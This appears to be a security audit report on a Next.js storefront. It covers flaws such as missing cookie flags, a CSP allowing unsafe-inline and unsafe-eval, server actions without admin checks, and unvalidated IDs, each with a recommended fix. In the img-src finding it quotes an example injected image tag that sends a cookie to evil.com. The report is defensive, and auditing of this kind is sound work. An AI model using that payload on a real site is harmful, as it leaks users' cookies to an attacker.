### 🔴 FLAW SEC-02: Admin Store Cookie Lacks Security Flags

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🔴 **CRITICAL** |
| **Location** | [actions/admin-store.ts:10](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L10) |
| **The Flaw** | The `adminStore` cookie is set with `{ path: "/" }` only — missing `HttpOnly`, `Secure`, `SameSite` attributes. |
| **The "Why"** | Without `HttpOnly`, client-side JavaScript (including XSS payloads) can read/modify this cookie. Without `Secure`, the cookie is sent over HTTP in plain text. Without `SameSite`, it's vulnerable to CSRF. While this cookie only controls streetwear/formal toggling, manipulating it could be a stepping stone for more sophisticated attacks, and it sets a bad precedent for any cookies added later. |
| **Recommendation** | ```typescript
cookieStore.set("adminStore", storeType, {
  path: "/",
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  maxAge: 60 * 60 * 24 * 30, // 30 days
});
``` |

---

### 🟠 FLAW SEC-03: CSP Allows `unsafe-inline` and `unsafe-eval`

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟠 **HIGH** |
| **Location** | [next.config.ts:47](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/next.config.ts#L47) |
| **The Flaw** | The `script-src` CSP directive includes `'unsafe-inline'` and `'unsafe-eval'`. This significantly weakens XSS protection that CSP is supposed to provide. |
| **The "Why"** | With `unsafe-inline` and `unsafe-eval`, an attacker who achieves XSS can execute arbitrary JavaScript in the user's browser, making CSP almost moot for its primary purpose. The CSP is "security theater" in its current form. |
| **Recommendation** | Use **nonce-based** CSP with Next.js. In Next.js 15, configure `experimental.serverActions` and use `nonce` from `headers()`. Replace `unsafe-inline` with `'nonce-<random>'` and remove `unsafe-eval`. Clerk's SDK supports nonce-based loading. If `unsafe-eval` is needed for dev, conditionally include it only in development. |

---

### 🟠 FLAW SEC-04: `migrateMissingStoreTypes` Server Action Lacks Auth Check

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟠 **HIGH** |
| **Location** | [actions/admin-store.ts:20-29](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L20-L29) |
| **The Flaw** | The `migrateMissingStoreTypes()` server action directly modifies the database but has **no authentication or authorization check**. Any client can call it. |
| **The "Why"** | While the action only sets NULL `storeType` values to "streetwear", an unauthenticated user shouldn't be able to trigger database writes. This also sets a pattern precedent: if similar migration actions are added without auth guards, the impact could be more severe. |
| **Recommendation** | Add the standard admin auth guard: ```typescript
const { userId, sessionClaims } = await auth();
if (!userId || sessionClaims?.metadata?.role !== "admin") {
  redirect("/");
}
``` |

---

### 🟠 FLAW SEC-05: [setAdminStoreType](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#8-12) Lacks Auth Guard

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟠 **HIGH** |
| **Location** | [actions/admin-store.ts:8-11](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#L8-L11) |
| **The Flaw** | The [setAdminStoreType()](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/admin-store.ts#8-12) function sets a cookie but doesn't verify the user is an admin. Any authenticated (or unauthenticated) user can call this server action. |
| **The "Why"** | While the cookie only affects the admin panel's current store context, server actions are accessible to any client. An attacker can use this as reconnaissance (observing that admin functionality exists) and it bypasses the principle of least privilege. |
| **Recommendation** | Add admin auth check before setting the cookie. |

---

### 🟡 FLAW SEC-06: [deleteProduct](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/deleteProduct.ts#10-20) Doesn't Validate `productId` Type/Range

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟡 **MEDIUM** |
| **Location** | [actions/deleteProduct.ts:10](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/deleteProduct.ts#L10) |
| **The Flaw** | The `productId` parameter is typed as `number` but not validated with Zod or runtime checks. A crafted RPC call could pass `NaN`, negative numbers, or very large numbers. |
| **The "Why"** | While Drizzle's parameterized queries prevent SQL injection, passing malformed IDs could cause unexpected behavior or error information leakage. [placeOrder](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/placeOrder.ts#44-234) uses Zod validation properly; other admin actions should follow the same pattern. |
| **Recommendation** | Add Zod validation: `z.number().int().positive().parse(productId)` at the start of every action that receives numeric IDs. Apply this same pattern to [deleteCategory](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/categories.ts#192-207), [deleteHeroImage](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/hero.ts#54-63), [deleteHomeVideo](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/video.ts#44-53), [deleteLookbookItem](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/lookbook.ts#76-85), [deletePromoCode](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/promo.ts#196-207), [togglePromoStatus](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/promo.ts#180-195), [updateOrderStatus](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/updateOrderStatus.ts#13-34), [updateLookbookItem](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/actions/lookbook.ts#86-104). |

---

### 🟡 FLAW SEC-07: `img-src` CSP Directive is Overly Permissive

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟡 **MEDIUM** |
| **Location** | [next.config.ts:50](file:///c:/Users/PC%20FACTORY/Desktop/MosaikWeb/next.config.ts#L50) |
| **The Flaw** | `img-src 'self' data: blob: https:` allows images to be loaded from **any HTTPS source**. |
| **The "Why"** | An attacker who can inject HTML (even without script execution) could load tracking pixels from external servers, exfiltrating data via image `src` URLs (e.g., `<img src="https://evil.com/track?cookie=...">`). |
| **Recommendation** | Restrict to known domains: `img-src 'self' data: blob: https://images.pexels.com https://*.supabase.co` |

---

### 🟢 FLAW SEC-08: No CSRF Token on Server Actions

| Attribute | Detail |
|-----------|--------|
| **Risk Level** | 🟢 **LOW** |
| **Location** | All files in `actions/` |
| **The Flaw** | Server actions in Next.js 15 include built-in CSRF protection via the `Origin` header check in the framework. However, there's no explicit CSRF token implementation. |
| **The "Why"** | Next.js provides CSRF protection by default for server actions, so this is low risk. However, if any custom API routes are added later (e.g., under `app/api/`), they won't have automatic CSRF protection. |
| **Recommendation** | Document that security relies on Next.js's built-in CSRF protection. If API routes are ever added, implement explicit CSRF tokens. |

